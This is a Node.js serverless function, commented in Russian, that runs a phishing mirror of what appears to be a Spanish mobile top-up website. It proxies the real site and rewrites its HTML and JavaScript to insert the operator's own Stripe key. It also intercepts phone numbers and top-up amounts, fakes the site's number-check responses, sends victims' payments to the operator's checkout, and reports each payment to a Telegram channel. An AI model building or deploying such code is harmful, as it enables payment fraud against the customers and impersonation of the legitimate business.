const fetch = require('node-fetch');
const { URL } = require('url');
const { Response } = require('node-fetch');
const { Headers } = require('node-fetch');

// Импортируем наши утилиты
const storage = require('../db/storage');
const telegram = require('./telegram');
const stripeUtils = require('./stripe');
const htmlModifier = require('./html-modifier');
const proxyUtils = require('./proxy');

// Конфигурация
const { 
  SOURCE_DOMAIN, 
  MIRROR_DOMAIN, 
  STRIPE_PUBLISHABLE_KEY 
} = require('./constants');

// Основная функция обработки запросов
exports.handler = async function(event, context) {
  // Получаем информацию о запросе
  const httpMethod = event.httpMethod;
  const path = event.path;
  const url = new URL(event.rawUrl);
  const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';
  const headers = event.headers;
  
  console.log(`Handling ${httpMethod} request to ${path}`);

  // Обработка CORS preflight запросов
  if (httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Max-Age': '86400'
      },
      body: ''
    };
  }

  try {
    // Обработка специальных маршрутов
    if (path === '/.netlify/functions/api/store-phone' && httpMethod === 'POST') {
      try {
        const data = JSON.parse(event.body);
        const phoneNumber = data.phoneNumber;
        
        // Валидация номера с более гибкой проверкой
        const cleanPhone = phoneNumber ? phoneNumber.replace(/\D/g, '') : '';
        
        if (cleanPhone && cleanPhone.length >= 9) {
          // Зберігаємо в базу даних
          await storage.storePhoneNumber(clientIP, cleanPhone);
          console.log('Stored phone number:', cleanPhone, 'for IP:', clientIP);
          return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Phone number stored' })
          };
        }
        return {
          statusCode: 400,
          body: JSON.stringify({ success: false, message: 'Invalid phone number' })
        };
      } catch (e) {
        console.error('Error storing phone:', e);
        return {
          statusCode: 500,
          body: JSON.stringify({ success: false, message: 'Error storing phone number' })
        };
      }
    }

    if (path === '/payment-success' || path.endsWith('/payment-success')) {
      const sessionId = url.searchParams.get('session_id');
      
      let phoneNumber = await storage.getPhoneNumber(clientIP) || 'Not Provided';
      let terminal = 'Unknown';
      let amount = 'Unknown';
      let orderNumber = 'Unknown';

      console.log('Payment success - Session ID:', sessionId);
      
      if (sessionId) {
        const paymentData = await storage.getPaymentData(sessionId);
        if (paymentData) {
          phoneNumber = paymentData.phoneNumber;
          terminal = paymentData.terminal;
          amount = paymentData.amount;
          orderNumber = paymentData.orderNumber;
          console.log('Found payment data:', paymentData);
          await storage.markPaymentProcessed(sessionId);
        } else {
          console.log('No payment data found for session:', sessionId);
        }

        const sent = await telegram.sendToTelegram(phoneNumber, terminal, amount, orderNumber);
        if (!sent) {
          console.log('Initial Telegram send failed, retrying cached messages');
          await telegram.retryCachedTelegramMessages();
        }
      }

      const html = htmlModifier.createPaymentResultHTML('success', { phoneNumber, amount });
      
      return {
        statusCode: 200,
        headers: { 
          'Content-Type': 'text/html;charset=UTF-8', 
          'Access-Control-Allow-Origin': '*' 
        },
        body: html
      };
    }

    if (path === '/payment-cancel' || path.endsWith('/payment-cancel')) {
      const html = htmlModifier.createPaymentResultHTML('cancel');
      
      return {
        statusCode: 200,
        headers: { 
          'Content-Type': 'text/html;charset=UTF-8', 
          'Access-Control-Allow-Origin': '*' 
        },
        body: html
      };
    }

    if (path === '/.netlify/functions/api/create-payment' && httpMethod === 'POST') {
      try {
        console.log('Processing create-payment request, headers:', headers);
        
        const contentType = headers['content-type'] || '';
        let amount, phoneNumber, successUrl, cancelUrl;

        if (contentType.includes('application/json')) {
          const data = JSON.parse(event.body);
          console.log('Payment JSON data received:', data);
          amount = data.amount;
          phoneNumber = data.phoneNumber;
          successUrl = data.successUrl || `https://${MIRROR_DOMAIN}/payment-success`;
          cancelUrl = data.cancelUrl || `https://${MIRROR_DOMAIN}/payment-cancel`;
        } else if (contentType.includes('application/x-www-form-urlencoded')) {
          const params = new URLSearchParams(event.body);
          amount = params.get('amount');
          phoneNumber = params.get('phoneNumber');
          successUrl = params.get('successUrl') || `https://${MIRROR_DOMAIN}/payment-success`;
          cancelUrl = params.get('cancelUrl') || `https://${MIRROR_DOMAIN}/payment-cancel`;
        } else {
          return {
            statusCode: 400,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: 'Unsupported content type' })
          };
        }

        // Очистка и валидация номера телефона
        if (phoneNumber) {
          phoneNumber = String(phoneNumber).replace(/\D/g, '');
          
          // Если номер испанский и начинается с 34, удаляем код страны
          if (phoneNumber.startsWith('34')) {
            phoneNumber = phoneNumber.substring(2);
          }
          
          console.log('Phone after cleaning:', phoneNumber);
        }

        // Проверяем наличие телефона и пытаемся получить из хранилища если нет
        if (!phoneNumber || phoneNumber.length < 9) {
          const cachedPhone = await storage.getPhoneNumber(clientIP);
          if (cachedPhone) {
            phoneNumber = cachedPhone;
            console.log('Using cached phone number:', phoneNumber);
          }
        }

        // Финальная проверка номера телефона
        if (!phoneNumber || phoneNumber.length < 9) {
          return {
            statusCode: 400,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: 'Valid phone number with at least 9 digits is required' })
          };
        }

        // Валидация суммы
        if (!amount || isNaN(amount)) {
          return {
            statusCode: 400,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: 'Invalid amount. Required: amount (number)' })
          };
        }

        console.log('Processing payment request:', { amount, phoneNumber, clientIP });

        // Сохраняем номер телефона для будущего использования
        await storage.storePhoneNumber(clientIP, phoneNumber);

        const { session } = await stripeUtils.createStripeCheckoutSession(
          parseFloat(amount),
          phoneNumber,
          successUrl,
          cancelUrl,
          clientIP
        );

        return {
          statusCode: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*'
          },
          body: JSON.stringify({
            sessionId: session.id,
            url: session.url
          })
        };
      } catch (error) {
        console.error('Error in handlePaymentRequest:', error);
        return {
          statusCode: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          },
          body: JSON.stringify({ error: error.message })
        };
      }
    }

    if (path === '/.netlify/functions/api/check_number_no_captcha' || path === '/.netlify/functions/api/check_number') {
      try {
        let phoneNumber = '';
        const contentType = headers['content-type'] || '';

        if (contentType.includes('application/json')) {
          const data = JSON.parse(event.body);
          phoneNumber = data.phone?.first || '';
          if (phoneNumber && phoneNumber.match(/^\d{9}$/)) {
            await storage.storePhoneNumber(clientIP, phoneNumber);
          }
        } else if (contentType.includes('application/x-www-form-urlencoded')) {
          const params = new URLSearchParams(event.body);
          phoneNumber = params.get('check_number[phone][first]') || '';
          if (phoneNumber && phoneNumber.match(/^\d{9}$/)) {
            await storage.storePhoneNumber(clientIP, phoneNumber);
          }
        } else {
          try {
            const bodyContent = event.body;
            const phoneMatch = bodyContent.match(/phone[^0-9]*([0-9]{9})/i);
            if (phoneMatch && phoneMatch[1]) {
              phoneNumber = phoneMatch[1];
              if (phoneNumber.match(/^\d{9}$/)) {
                await storage.storePhoneNumber(clientIP, phoneNumber);
              }
            }
          } catch (e) { }
        }

        return {
          statusCode: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*'
          },
          body: JSON.stringify(proxyUtils.simulatePhoneCheckResponse(phoneNumber))
        };
      } catch (error) {
        // Если возникла ошибка при обработке номера, перенаправляем запрос на оригинальный сайт
        const url = new URL(event.rawUrl);
        const modifiedRequest = await proxyUtils.modifyApiRequest(event, url, SOURCE_DOMAIN);
        const response = await fetch(modifiedRequest);
        const responseData = await response.json();
        
        return {
          statusCode: response.status,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          },
          body: JSON.stringify(responseData)
        };
      }
    }

    if (path.startsWith('/.netlify/functions/api/store-backend')) {
      const originalUrl = path.replace('/.netlify/functions/api/store-backend', '');
      const newUrl = new URL(`https://${MIRROR_DOMAIN}${originalUrl}${url.search ? url.search : ''}`);
      
      try {
        const response = await proxyUtils.handleStoreBackend(event, newUrl);
        const responseBody = await response.text();
        
        return {
          statusCode: response.status,
          headers: Object.fromEntries(response.headers.entries()),
          body: responseBody
        };
      } catch (error) {
        console.error('Error handling store backend:', error);
        return {
          statusCode: 500,
          body: JSON.stringify({ error: 'Error proxying to store backend' })
        };
      }
    }

    if (path === '/.netlify/functions/api/retry-telegram') {
      try {
        const result = await telegram.retryCachedTelegramMessages();
        return {
          statusCode: 200,
          body: JSON.stringify(result)
        };
      } catch (error) {
        console.error('Error retrying Telegram messages:', error);
        return {
          statusCode: 500,
          body: JSON.stringify({ error: 'Error retrying Telegram messages' })
        };
      }
    }

    if (path === '/.netlify/functions/api/topup' || path.endsWith('/api/topup')) {
      try {
        const contentType = headers['content-type'] || '';
        let amount, phoneNumber;

        // 1. Пытаемся получить данные из URL-параметров
        if (url.searchParams.has('phone') || url.searchParams.has('amount')) {
          phoneNumber = url.searchParams.get('phone') || url.searchParams.get('phone_number') || 
                      url.searchParams.get('msisdn') || url.searchParams.get('number');
          amount = url.searchParams.get('amount') || url.searchParams.get('topup_amount') || 
                  url.searchParams.get('value');
          
          console.log('Found in URL params - Phone:', phoneNumber, 'Amount:', amount);
        }

        // 2. Если данных в URL нет, пытаемся получить из тела запроса
        if ((!phoneNumber || !amount) && event.body) {
          console.log('Checking request body, content-type:', contentType);
          
          if (contentType.includes('application/x-www-form-urlencoded')) {
            const params = new URLSearchParams(event.body);
            console.log('Form data keys:', Array.from(params.keys()));
            
            // Ищем телефон в разных форматах
            const phoneParams = ['phone', 'phone_number', 'msisdn', 'number', 'phoneNumber', 
                                'recharge_number[phone][first]', 'mobile', 'mobile_number'];
            
            for (const param of phoneParams) {
              if (params.has(param)) {
                phoneNumber = params.get(param);
                console.log(`Found phone in form param [${param}]:`, phoneNumber);
                break;
              }
            }
            
            // Ищем сумму в разных форматах
            const amountParams = ['amount', 'topup_amount', 'value', 'recharge_number[amount]'];
            
            for (const param of amountParams) {
              if (params.has(param)) {
                amount = params.get(param);
                console.log(`Found amount in form param [${param}]:`, amount);
                break;
              }
            }
            
            // Если не нашли по конкретным ключам, ищем по похожим именам
            if (!phoneNumber) {
              for (const [key, value] of params.entries()) {
                if (key.includes('phone') || key.includes('number') || key.includes('mobile') || key.includes('telefono')) {
                  phoneNumber = value;
                  console.log(`Found phone in similar form param [${key}]:`, phoneNumber);
                  break;
                }
              }
            }
            
            console.log('Found in form data - Phone:', phoneNumber, 'Amount:', amount);
          } else if (contentType.includes('application/json')) {
            try {
              const jsonData = JSON.parse(event.body);
              console.log('JSON data keys:', Object.keys(jsonData));
              
              // Ищем телефон в разных местах JSON
              const phoneKeys = ['phone', 'phone_number', 'msisdn', 'number', 'phoneNumber'];
              
              for (const key of phoneKeys) {
                if (jsonData[key]) {
                  phoneNumber = jsonData[key];
                  console.log(`Found phone in JSON [${key}]:`, phoneNumber);
                  break;
                }
              }
              
              // Проверяем вложенные объекты
              if (!phoneNumber && jsonData.recharge_number) {
                if (jsonData.recharge_number.phone && jsonData.recharge_number.phone.first) {
                  phoneNumber = jsonData.recharge_number.phone.first;
                  console.log('Found phone in nested JSON:', phoneNumber);
                }
              }
              
              // Ищем сумму в разных местах JSON
              if (jsonData.amount) amount = jsonData.amount;
              else if (jsonData.topup_amount) amount = jsonData.topup_amount;
              else if (jsonData.value) amount = jsonData.value;
              else if (jsonData.recharge_number && jsonData.recharge_number.amount) {
                amount = jsonData.recharge_number.amount;
              }
              
              console.log('Found in JSON data - Phone:', phoneNumber, 'Amount:', amount);
            } catch (e) {
              console.error('Error parsing JSON:', e);
            }
          } else {
            // Используем регулярные выражения если формат не известен
            try {
              const bodyText = event.body;
              
              // Ищем телефон с помощью регулярных выражений
              const phoneRegexps = [
                /phone[^\d]*(\d{9,})/i,
                /phone_number[^\d]*(\d{9,})/i,
                /msisdn[^\d]*(\d{9,})/i,
                /number[^\d]*(\d{9,})/i,
                /mobile[^\d]*(\d{9,})/i,
                /telefono[^\d]*(\d{9,})/i,
                /recharge_number\[phone\]\[first\][^\d]*(\d{9,})/i,
                /(\d{9,})/  // В крайнем случае ищем 9+ цифр подряд
              ];
              
              for (const regex of phoneRegexps) {
                const match = bodyText.match(regex);
                if (match && match[1]) {
                  phoneNumber = match[1];
                  console.log(`Found phone using regex ${regex}:`, phoneNumber);
                  break;
                }
              }
              
              // Ищем сумму
              const amountMatch = bodyText.match(/amount[^\d]*(\d+)/i) || 
                                 bodyText.match(/topup[^\d]*(\d+)/i) || 
                                 bodyText.match(/value[^\d]*(\d+)/i);
              if (amountMatch && amountMatch[1]) {
                amount = amountMatch[1];
                console.log('Found amount using regex:', amount);
              }
            } catch (e) {
              console.error('Error parsing body with regex:', e);
            }
          }
        }

        // 3. Очистка и валидация номера телефона
        if (phoneNumber) {
          // Убираем всё кроме цифр
          phoneNumber = String(phoneNumber).replace(/\D/g, '');
          
          // Если номер испанский и начинается с 34, удаляем код страны
          if (phoneNumber.startsWith('34')) {
            phoneNumber = phoneNumber.substring(2);
          }
          
          console.log('Phone after cleaning:', phoneNumber);
          
          // Сохраняем номер для повторного использования
          if (phoneNumber && phoneNumber.length >= 9) {
            await storage.storePhoneNumber(clientIP, phoneNumber);
            console.log('Stored phone in database:', phoneNumber);
          }
        }

        // 4. Если номер не найден или не валиден, пробуем получить из кэша
        if (!phoneNumber || phoneNumber.length < 9) {
          console.log('No valid phone from request, checking storage');
          const cachedPhone = await storage.getPhoneNumber(clientIP);
          if (cachedPhone) {
            phoneNumber = cachedPhone;
            console.log('Retrieved phone from database:', phoneNumber);
          }
        }

        // 5. Выводим финальные данные для проверки
        console.log('Final phone number check:', {
          phoneNumber: phoneNumber,
          length: phoneNumber ? phoneNumber.length : 0,
          isValid: phoneNumber && phoneNumber.length >= 9,
          amount: amount
        });

        // Проверяем наличие телефона и перенаправляем если нет
        if (!phoneNumber || phoneNumber.length < 9) {
          console.error('No valid phone number found. Redirecting to recharge page.');
          return {
            statusCode: 302,
            headers: {
              'Location': `https://${MIRROR_DOMAIN}/recargar`,
              'Cache-Control': 'no-cache'
            },
            body: ''
          };
        }

        // Валидация и установка суммы
        let numericAmount = parseFloat(amount);
        if (isNaN(numericAmount) || numericAmount <= 0) {
          numericAmount = 5;
          console.log('Using default amount:', numericAmount);
        } else {
          console.log('Using parsed amount:', numericAmount);
        }

        console.log('Final values for payment - Phone:', phoneNumber, 'Amount:', numericAmount);

        // Создаем сессию Stripe
        const { session } = await stripeUtils.createStripeCheckoutSession(
          numericAmount,
          phoneNumber,
          `https://${MIRROR_DOMAIN}/payment-success`,
          `https://${MIRROR_DOMAIN}/payment-cancel`,
          clientIP
        );

        if (session.url) {
          console.log('Redirecting to Stripe:', session.url);
          return {
            statusCode: 302,
            headers: {
              'Location': session.url,
              'Cache-Control': 'no-cache'
            },
            body: ''
          };
        }
        
        throw new Error('Failed to create Stripe checkout URL');
      } catch (error) {
        console.error('Error in handleTopupRequest:', error);
        return {
          statusCode: 302,
          headers: {
            'Location': `https://${MIRROR_DOMAIN}/recargar`,
            'Cache-Control': 'no-cache'
          },
          body: ''
        };
      }
    }

    // Для всех остальных запросов проксируем на оригинальный сайт
    const proxyHeaders = new Headers();
    for (const [key, value] of Object.entries(headers)) {
      if (!['host', 'origin', 'referer'].includes(key.toLowerCase())) {
        proxyHeaders.set(key, value);
      }
    }

    let bodyContent = null;
    if (['POST', 'PUT', 'PATCH'].includes(httpMethod)) {
      try {
        bodyContent = event.body;
      } catch (e) { 
        console.error('Error processing request body for proxy:', e);
      }
    }

    // Создаем прокси-запрос к оригинальному сайту
    const proxyUrl = `https://${SOURCE_DOMAIN}${url.pathname}${url.search}`;
    console.log(`Proxying request to: ${proxyUrl}`);
    
    const proxyRequest = new Request(proxyUrl, {
      method: httpMethod,
      headers: proxyHeaders,
      body: bodyContent,
      redirect: 'manual'
    });

    let response = await fetch(proxyRequest);
    
    // Обрабатываем редиректы
    if (response.status >= 300 && response.status < 400) {
      response = await proxyUtils.followRedirects(response, proxyHeaders);
    }

    const contentType = response.headers.get('Content-Type') || '';
    console.log('Proxy response:', { status: response.status, contentType, url: url.pathname });

    // Модифицируем HTML и JavaScript контент
    if (contentType.includes('text/html')) {
      const modifiedResponse = await htmlModifier.modifyHTML(
        response, 
        MIRROR_DOMAIN, 
        SOURCE_DOMAIN, 
        STRIPE_PUBLISHABLE_KEY
      );
      
      const body = await modifiedResponse.text();
      return {
        statusCode: modifiedResponse.status,
        headers: {
          'Content-Type': 'text/html;charset=UTF-8',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': '*'
        },
        body: body
      };
    }
    
    if (contentType.includes('javascript')) {
      const modifiedResponse = await htmlModifier.modifyJavaScript(
        response, 
        MIRROR_DOMAIN, 
        SOURCE_DOMAIN, 
        STRIPE_PUBLISHABLE_KEY
      );
      
      const body = await modifiedResponse.text();
      return {
        statusCode: modifiedResponse.status,
        headers: {
          'Content-Type': 'application/javascript',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': '*'
        },
        body: body
      };
    }

    // Для всех остальных типов контента просто возвращаем ответ от оригинального сайта
    const responseBody = await response.text();
    const responseHeaders = {};
    
    for (const [key, value] of response.headers.entries()) {
      responseHeaders[key] = value;
    }
    
    responseHeaders['Access-Control-Allow-Origin'] = '*';
    responseHeaders['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS';
    responseHeaders['Access-Control-Allow-Headers'] = '*';

    return {
      statusCode: response.status,
      headers: responseHeaders,
      body: responseBody
    };
  } catch (error) {
    console.error('Error handling request:', error);
    return {
      statusCode: 500,
      headers: { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' },
      body: `Error: ${error.message}`
    };
  }
};